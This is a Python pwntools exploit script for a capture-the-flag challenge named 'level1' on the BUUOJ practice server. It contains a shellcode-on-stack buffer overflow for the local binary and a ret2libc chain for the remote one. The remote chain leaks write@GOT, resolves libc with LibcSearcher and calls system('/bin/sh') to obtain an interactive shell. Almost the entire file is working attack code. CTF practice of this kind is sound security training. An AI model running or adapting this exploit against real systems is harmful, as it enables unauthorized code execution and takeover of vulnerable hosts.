from pwn import *
from LibcSearcher import *
context.arch='i386'

# there is not protect almostly, and the program leak the buf addr on stack
# so, just write shellcode to get shell locally
# but on server, the buf addr will leak after we input,
# so, it's difficult to write shellcode on stack,
# but we still could leak libc by stack overflow and get shell


# p = process('./level1')
p = remote('node3.buuoj.cn',26935)

def locally():
	p.recvuntil("What's this:")
	buf_addr = int(p.recvuntil('?\n',drop=True),16)
	log.success('buf_addr = %#x',buf_addr)
	payload = asm(shellcraft.sh()).ljust(0x88+4,'\x00')
	payload += p32(buf_addr)
	p.send(payload)
	sleep(1)
	p.interactive()

def servers():
	elf = ELF('./level1',checksec=False)
	payload = 'A'*(0x88+4)
	payload += flat([
		elf.plt['write'], elf.sym['main'], 1, elf.got['write'], 8
		])
	p.send(payload)
	write_addr = u32(p.recv(4))
	log.success('write_addr = %#x',write_addr)

	libc = LibcSearcher('write',write_addr)
	libc_base = write_addr - libc.dump('write')
	system_addr = libc_base + libc.dump('system')
	binsh = libc_base + libc.dump('str_bin_sh')
	log.info('system_addr = %#x, binsh = %#x'%(system_addr,binsh))

	payload = 'A'*(0x88+4)
	payload += flat([system_addr, elf.sym['main'], binsh])
	p.send(payload)
	sleep(1)
	p.interactive()

servers()